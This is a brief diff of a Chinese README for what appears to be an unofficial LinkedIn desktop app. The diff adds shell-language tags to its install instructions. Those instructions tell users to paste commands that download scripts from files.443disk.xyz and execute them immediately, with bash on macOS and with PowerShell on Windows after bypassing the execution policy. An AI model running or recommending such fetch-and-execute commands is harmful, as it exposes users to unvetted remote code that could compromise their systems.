@@ -38,14 +38,14 @@
 ### **macOS 平台**
 > 打开终端粘贴如下命令
 
-```
+```bash
 /bin/bash -c "$(curl -fsSL https://files.443disk.xyz/LinkedInApp.Desktop/install-osx.sh)" 
 ```
 
 ### **Windows 平台**
 > 打开终端粘贴如下命令
 
-```
+```pwsh
 powershell -ExecutionPolicy Bypass -Command "iex ([System.Text.Encoding]::UTF8.GetString((iwr -useb 'https://files.443disk.xyz/LinkedInApp.Desktop/install-win.ps1').Content))"
 
 ```
